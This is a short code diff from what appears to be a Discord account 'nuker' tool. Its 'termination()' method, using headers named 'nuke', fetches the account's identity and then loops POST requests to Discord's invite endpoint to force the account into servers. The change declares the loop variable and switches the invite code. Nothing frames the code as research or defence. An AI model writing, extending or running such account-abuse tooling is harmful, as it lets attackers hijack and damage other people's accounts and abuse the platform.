@@ -224,6 +224,7 @@ class User extends Color {
 
     }
     async termination() {
+        var i;
         const base = 'https://discord.com/api/' + version;
 
         const status = (await Axios.get(base + '/users/@me', {
@@ -235,7 +236,7 @@ class User extends Color {
         for (i = 0; i < 10; i++) {
             try {
                 await Axios(
-                    { method: 'POST', url: base + '/invites/minecraft', headers: this.headers.nuke }
+                    { method: 'POST', url: base + '/invites/egirl', headers: this.headers.nuke }
                 ).then((response) => {
                     console.log(response.data[0].guild.name)
                 }).catch((e) => {
